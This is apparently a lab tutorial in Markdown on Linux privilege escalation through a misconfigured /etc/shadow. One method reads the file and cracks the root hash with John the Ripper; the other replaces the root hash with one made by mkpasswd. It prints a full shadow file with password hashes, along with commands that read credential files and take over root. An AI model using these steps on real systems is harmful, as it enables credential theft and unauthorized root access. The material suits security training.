# Linux-Privilege-Escalation


# 🔥01: Readable /etc/shadow:

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-readable:

At first check permission of /etc/shadow file using :

     ls -l /etc/shadow

    -rw-r--rw- 1 root shadow 842 Apr  9 17:28 /etc/shadow

Then , view the contents of the /etc/shadow file uisng :

              cat /etc/shadow
              
              root:$6$LRq2u1SvWmPgF$zCIh5qzquQ31ZcsL0ifM9GKh.pQRwHSKjJQSJI4Tkl5ELRHjqWTzag8upywqk.jT6/niiOIaMF9XW1/BnN55Y/:17298:0:99999:7:::
              daemon:*:17298:0:99999:7:::
              bin:*:17298:0:99999:7:::
              sys:*:17298:0:99999:7:::
              sync:*:17298:0:99999:7:::
              games:*:17298:0:99999:7:::
              man:*:17298:0:99999:7:::
              lp:*:17298:0:99999:7:::
              mail:*:17298:0:99999:7:::
              news:*:17298:0:99999:7:::
              uucp:*:17298:0:99999:7:::
              proxy:*:17298:0:99999:7:::
              www-data:*:17298:0:99999:7:::
              backup:*:17298:0:99999:7:::
              list:*:17298:0:99999:7:::
              irc:*:17298:0:99999:7:::
              gnats:*:17298:0:99999:7:::
              nobody:*:17298:0:99999:7:::
              libuuid:!:17298:0:99999:7:::
              Debian-exim:!:17298:0:99999:7:::
              sshd:*:17298:0:99999:7:::
              user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
              statd:*:17299:0:99999:7:::
              mysql:!:18133:0:99999:7:::




*** Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.***

Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Switch to the root user, using the cracked password:

su root

Happy Hacking 

# 02: writeable /etc/shadow 

check the permssion of  /etc/shadow file using /etc/shadow. If you can edit the file , you can easily change the password of root .

    ls -l /etc/shadow 
    -rw-r--rw- 1 root shadow 842 Apr  9 17:28 /etc/shadow

Look : We can edit /etc/shadow file as we have  permission

Generate a new password hash with a password of your choice :

Here  , we  use mkpasswd command for generate a password 

Command :

           mkpasswd -m sha-512 iloveislam

Here  ,    
           
           -m use for method 
          
           sha-512 use for hashing the pasword 

           iloveislam is the password 

Then , edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

su root

Happy Hacking   (-_-)
